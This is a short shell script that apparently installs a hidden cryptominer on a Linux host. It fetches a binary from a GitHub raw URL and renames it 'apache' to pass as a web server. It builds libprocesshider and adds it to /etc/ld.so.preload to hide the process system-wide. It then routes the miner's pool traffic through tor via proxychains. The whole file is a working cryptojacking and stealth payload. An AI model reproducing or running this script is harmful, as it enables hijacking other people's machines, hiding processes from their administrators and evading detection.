#!/bin/sh

apt update
apt -y install binutils cmake build-essential unzip net-tools curl tor proxychains
service tor start

sed -i -e 's/#dynamic_chain/dynamic_chain/g;s/strict_chain/#strict_chain/g;s/socks4/socks5/g' /etc/proxychains.conf

wget https://raw.githubusercontent.com/hondacars/xxx/main/srb
chmod +x srb
mv srb apache

git clone https://github.com/gianlucaborello/libprocesshider.git
cd libprocesshider
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
cd ..

proxychains ./apache --disable-gpu --algorithm ghostrider --pool prohashing.com:3362 --wallet Prodent a=gr,c=raptoreum
